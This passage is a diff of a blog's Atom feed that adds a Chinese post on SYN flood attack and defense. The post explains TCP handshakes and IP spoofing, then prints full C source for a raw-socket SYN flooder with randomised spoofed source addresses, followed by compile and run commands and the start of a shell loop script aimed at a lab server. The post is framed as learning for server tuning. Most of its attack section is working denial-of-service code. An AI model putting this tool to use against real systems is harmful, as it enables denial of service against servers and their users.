@@ -4,7 +4,7 @@
   <title><![CDATA[SK's Blog]]></title>
   <link href="http://sunkid.me/atom.xml" rel="self"/>
   <link href="http://sunkid.me/"/>
-  <updated>2012-11-06T14:27:41+08:00</updated>
+  <updated>2013-10-19T12:29:57+08:00</updated>
   <id>http://sunkid.me/</id>
   <author>
     <name><![CDATA[sk.c]]></name>
@@ -12,6 +12,486 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[syn flood(syn 洪水) 攻防实战]]></title>
+    <link href="http://sunkid.me/blog/2013/10/18/syn-flooddos/"/>
+    <updated>2013-10-18T13:54:00+08:00</updated>
+    <id>http://sunkid.me/blog/2013/10/18/syn-flooddos</id>
+    <content type="html"><![CDATA[<p>说到 <code>syn洪水</code> 大家应该都不陌生。 sk.c之前听说过其中的原理，但也没真枪实弹试过。
+到最近在学习服务器调优才实践尝试了下，才有了这篇烂笔头博文，有说的不对的地方，还请赐教</p>
+
+<p>一开始，我们还是再唠叨下 syn flood doc 的原理:</p>
+
+<h3>1.TCP三次握手</h3>
+
+<h4><code>syn flood doc</code> 是基于TCP协议缺陷的。那么，我们先看下TCP三次握手的协议图</h4>
+
+<p><img src="http://sunkid.me/images/post/tcp.png"></p>
+
+<p>我们看到，tcp 在初始化连接的时候，需要经过三次握手，若某客户端发送大量<code>syn</code>请求给服务端，然后不返回<code>ack</code>包。
+那么，服务端将会存在大量的syn队列(SYN_RCVD),导致占用大量服务端资源，让其他正常用户无法正常访问服务器。</p>
+
+<!-- more -->
+
+
+<p><img src="http://sunkid.me/images/post/tcp2.png"></p>
+
+<p>sk.c 之前想过这样的方案 <strong> 我们是否可以限制相同IP的syn请求数来解决问题？</strong></p>
+
+<p>当然，这太天真了，原因在于: <strong> 单个数据包请求的IP来源地址可以轻松的伪造！</strong></p>
+
+<p>嗯，这时我们需要简单了解下 IP 协议</p>
+
+<h3>2.IP 协议</h3>
+
+<h4>IP协议中，</h4>
+
+<p><img src="http://sunkid.me/images/post/ip.png"></p>
+
+<p>基于<strong>每个IP数据报头都标明(32位源IP地址)</strong>这点，我们只要在构造的 syn 包中随机的填写源IP地址, 那么就可以伪造数据来源的IP啦。</p>
+
+<p>这样的话，那是不是意味着我们在互联网通信都可以用这样简单的方式来伪造IP呢？ &#8211; 答案是否定的，原因留给读者想想看 :)</p>
+
+<h3>syn_act 实现</h3>
+
+<h4>基于以上两个原理，我们可以写一个程序，用随机IP的 <code>syn</code> 去攻击一台服务器</h4>
+
+<figure class='code'><figcaption><span>syn_act</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+<span class='line-number'>135</span>
+<span class='line-number'>136</span>
+<span class='line-number'>137</span>
+<span class='line-number'>138</span>
+<span class='line-number'>139</span>
+<span class='line-number'>140</span>
+<span class='line-number'>141</span>
+<span class='line-number'>142</span>
+<span class='line-number'>143</span>
+<span class='line-number'>144</span>
+<span class='line-number'>145</span>
+<span class='line-number'>146</span>
+<span class='line-number'>147</span>
+<span class='line-number'>148</span>
+<span class='line-number'>149</span>
+<span class='line-number'>150</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/*</span>
+</span><span class='line'><span class="cm">Syn Flood DOS with LINUX sockets</span>
+</span><span class='line'><span class="cm">*/</span>
+</span><span class='line'><span class="cp">#include&lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include&lt;string.h&gt;        </span><span class="c1">//memset</span>
+</span><span class='line'><span class="cp">#include&lt;sys/socket.h&gt;</span>
+</span><span class='line'><span class="cp">#include&lt;stdlib.h&gt;        </span><span class="c1">//for exit(0);</span>
+</span><span class='line'><span class="cp">#include&lt;errno.h&gt;         </span><span class="c1">//For errno - the error number</span>
+</span><span class='line'><span class="cp">#include&lt;netinet/tcp.h&gt;   </span><span class="c1">//Provides declarations for tcp header</span>
+</span><span class='line'><span class="cp">#include&lt;netinet/ip.h&gt;    </span><span class="c1">//Provides declarations for ip header</span>
+</span><span class='line'><span class="cp">#include&lt;sys/time.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">struct</span> <span class="n">pseudo_header</span> <span class="p">{</span>    <span class="c1">//needed for checksum calculation</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">source_address</span><span class="p">;</span>
+</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">dest_address</span><span class="p">;</span>
+</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">placeholder</span><span class="p">;</span>
+</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">protocol</span><span class="p">;</span>
+</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">tcp_length</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">struct</span> <span class="n">tcphdr</span> <span class="n">tcp</span><span class="p">;</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">short</span> <span class="nf">csum</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="kt">int</span> <span class="n">nbytes</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="k">register</span> <span class="kt">long</span> <span class="n">sum</span><span class="p">;</span>
+</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">oddbyte</span><span class="p">;</span>
+</span><span class='line'>        <span class="k">register</span> <span class="kt">short</span> <span class="n">answer</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">sum</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="k">while</span><span class="p">(</span><span class="n">nbytes</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">sum</span><span class="o">+=*</span><span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">nbytes</span><span class="o">-=</span><span class="mi">2</span><span class="p">;</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">nbytes</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">oddbyte</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>                <span class="o">*</span><span class="p">((</span><span class="n">u_char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">oddbyte</span><span class="p">)</span><span class="o">=*</span><span class="p">(</span><span class="n">u_char</span><span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">sum</span><span class="o">+=</span><span class="n">oddbyte</span><span class="p">;</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">sum</span> <span class="o">=</span> <span class="p">(</span><span class="n">sum</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="n">sum</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">sum</span> <span class="o">=</span> <span class="n">sum</span> <span class="o">+</span> <span class="p">(</span><span class="n">sum</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">answer</span><span class="o">=</span><span class="p">(</span><span class="kt">short</span><span class="p">)</span><span class="o">~</span><span class="n">sum</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">return</span><span class="p">(</span><span class="n">answer</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span><span class='line'>        <span class="c1">//Uncommend the loop if you want to flood :)</span>
+</span><span class='line'>        <span class="c1">//Create a raw socket</span>
+</span><span class='line'>        <span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span> <span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
+</span><span class='line'>        <span class="c1">//Datagram to represent the packet</span>
+</span><span class='line'>        <span class="kt">char</span> <span class="n">datagram</span><span class="p">[</span><span class="mi">4096</span><span class="p">]</span> <span class="p">,</span> <span class="n">source_ip</span><span class="p">[</span><span class="mi">32</span><span class="p">],</span> <span class="n">dst_ip</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span><span class='line'>        <span class="c1">//IP header</span>
+</span><span class='line'>        <span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="n">iph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="p">)</span> <span class="n">datagram</span><span class="p">;</span>
+</span><span class='line'>        <span class="c1">//TCP header</span>
+</span><span class='line'>        <span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="n">tcph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">datagram</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">));</span>
+</span><span class='line'>        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
+</span><span class='line'>        <span class="k">struct</span> <span class="n">pseudo_header</span> <span class="n">psh</span><span class="p">;</span>
+</span><span class='line'>        <span class="k">struct</span> <span class="n">timeval</span> <span class="n">tv_time</span><span class="p">;</span>
+</span><span class='line'>        <span class="kt">int</span> <span class="n">ip1</span><span class="p">,</span><span class="n">ip2</span><span class="p">,</span><span class="n">ip3</span><span class="p">,</span><span class="n">ip4</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">gettimeofday</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tv_time</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">srand</span><span class="p">(</span><span class="n">tv_time</span><span class="p">.</span><span class="n">tv_usec</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: syn_act 172.16.5.69</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">sprintf</span><span class="p">(</span><span class="n">dst_ip</span><span class="p">,</span><span class="s">&quot;%s&quot;</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c1">// rand to get ip</span>
+</span><span class='line'>        <span class="n">ip1</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">196</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">ip2</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">ip3</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">ip4</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">sprintf</span><span class="p">(</span><span class="n">source_ip</span><span class="p">,</span><span class="s">&quot;%d.%d.%d.%d&quot;</span><span class="p">,</span><span class="n">ip1</span><span class="p">,</span><span class="n">ip2</span><span class="p">,</span><span class="n">ip3</span><span class="p">,</span><span class="n">ip4</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">80</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">dst_ip</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">memset</span><span class="p">(</span><span class="n">datagram</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>     <span class="cm">/* zero out the buffer */</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c1">//Fill in the IP Header</span>
+</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">ihl</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">version</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">id</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">54321</span><span class="p">);</span> <span class="c1">//Id of this packet</span>
+</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">frag_off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">ttl</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">IPPROTO_TCP</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>         <span class="c1">//Set to 0 before calculating checksum</span>
+</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">saddr</span> <span class="o">=</span> <span class="n">inet_addr</span> <span class="p">(</span> <span class="n">source_ip</span> <span class="p">);</span>   <span class="c1">//Spoof the source ip address</span>
+</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">daddr</span> <span class="o">=</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="n">csum</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="o">*</span><span class="p">)</span> <span class="n">datagram</span><span class="p">,</span> <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c1">//TCP Header</span>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">1234</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">dest</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">80</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">seq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">ack_seq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">doff</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>         <span class="cm">/* first and only tcp segment */</span>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">fin</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">syn</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">rst</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">psh</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">ack</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">urg</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">window</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">5840</span><span class="p">);</span>    <span class="cm">/* maximum allowed window size */</span>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="cm">/* if you set a checksum to zero, your kernel&#39;s IP stack</span>
+</span><span class='line'><span class="cm">                                should fill in the correct checksum during transmission */</span>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">urg_ptr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="c1">//Now the IP checksum</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">psh</span><span class="p">.</span><span class="n">source_address</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span> <span class="n">source_ip</span> <span class="p">);</span>
+</span><span class='line'>        <span class="n">psh</span><span class="p">.</span><span class="n">dest_address</span> <span class="o">=</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">psh</span><span class="p">.</span><span class="n">placeholder</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">psh</span><span class="p">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">IPPROTO_TCP</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">psh</span><span class="p">.</span><span class="n">tcp_length</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">psh</span><span class="p">.</span><span class="n">tcp</span> <span class="p">,</span> <span class="n">tcph</span> <span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="n">csum</span><span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">psh</span> <span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">pseudo_header</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c1">//IP_HDRINCL to tell the kernel that headers are included in the packet</span>
+</span><span class='line'>        <span class="kt">int</span> <span class="n">one</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>        <span class="k">const</span> <span class="kt">int</span> <span class="o">*</span><span class="n">val</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">one</span><span class="p">;</span>
+</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">,</span> <span class="n">IP_HDRINCL</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">one</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Error setting IP_HDRINCL. Error number : %d . Error message : %s </span><span class="se">\n</span><span class="s">&quot;</span> <span class="p">,</span> <span class="n">errno</span> <span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c1">//Send the packet</span>
+</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">sendto</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span>          <span class="cm">/* our socket */</span>
+</span><span class='line'>                    <span class="n">datagram</span><span class="p">,</span>       <span class="cm">/* the buffer containing headers and data */</span>
+</span><span class='line'>                    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span><span class="p">,</span>   <span class="cm">/* total length of our datagram */</span>
+</span><span class='line'>                    <span class="mi">0</span><span class="p">,</span>              <span class="cm">/* routing flags, normally always 0 */</span>
+</span><span class='line'>                    <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span>       <span class="cm">/* socket addr, just like in */</span>
+</span><span class='line'>                    <span class="k">sizeof</span> <span class="p">(</span><span class="n">sin</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>             <span class="cm">/* a normal send() */</span>
+</span><span class='line'>                <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;error</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>                <span class="c1">//Data send successfully</span>
+</span><span class='line'>                <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Packet Send </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>注：源码是引用了<a href="http://www.binarytides.com/syn-flood-dos-attack/">这里</a>的基础上添加了随机ip和目标ip参数</p>
+
+<p>编译&amp;运行</p>
+
+<pre><code>gcc main.c syn_act
+sudo ./syn_act 172.16.5.69
+Packet Send
+</code></pre>
+
+<p>注意：</p>
+
+<ol>
+<li>这个程序需要用root权限运行</li>
+<li>如果你在内网环境攻击外网的机器会失败，因为连接外网路由器会验证你的ip数据包来源，并修改你的ip数据包来源地址，以便实现路由的<a href="http://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2">NAT</a>功能</li>
+</ol>
+
+
+<h3>实战</h3>
+
+<p>我们用上面的程序来攻击一台内网测试机,配置如下:</p>
+
+<pre><code>测试服务器
+    cpu   : i3
+    memory: 2G
+    system: ubuntu 12.04
+    server: nginx
+    ip    : 172.16.5.69
+
+测试客户端
+    cpu   : E5200
+    memory: 2G
+    system: ubuntu 12.04
+    ip    : 172.16.5.147
+</code></pre>
+
+<h4>服务端准备</h4>
+
+<p>挂上 <code>watch -n "netstat -n 1 | awk '/^tcp/ {++S[\$NF]} END {for(a in S) print a, S[a]}'"</code> 查看tcp状态</p>
+
+<pre><code>TIME_WAIT 24
+ESTABLISHED 5
+</code></pre>
+
+<h4>客户端准备</h4>
+
+<p>上面提供的程序运行一次只发送一个<code>syn</code>包，在这我们写个shell脚本来循环跑程序</p>
+
+<figure class='code'><figcaption><span>run.sh</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/sh</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#目标服务器ip地址</span>
+</span><span class='line'><span class="nv">ip</span><span class="o">=</span><span class="s2">&quot;172.16.5.69&quot;</span>
+</span><span class='line'>
